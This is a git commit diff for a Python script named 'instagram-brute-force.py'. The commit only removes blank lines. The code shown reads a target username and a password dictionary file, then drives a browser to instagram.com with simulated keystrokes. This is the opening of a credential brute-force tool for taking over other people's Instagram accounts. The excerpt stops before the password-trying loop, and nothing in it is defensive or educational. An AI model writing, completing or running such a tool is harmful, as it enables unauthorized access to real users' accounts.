b778d14cc179724844c16e7f5008f8109580fb7b
RoshanDon007 <89975472+RoshanDon007@users.noreply.github.com>
2021-09-06 13:30:16 +0530

    Update instagram-brute-force.py

--- instagram-brute-force.py
+++ instagram-brute-force.py
@@ -3,18 +3,14 @@ from pynput.keyboard import Key, Controller
 import time
 username = input('Username: ')
 dictionary = input('Choose Dictionary: ')
-
 file = open(f'{dictionary}.txt', 'r')
 bruteforce = []
 for line in file:
     line = line.strip()
     bruteforce.append(line)
 file.close()
-
 web = Browser()
 keyboard = Controller()
-
-
 web.go_to('www.instagram.com')
 time.sleep(3)
 keyboard.press(Key.enter)
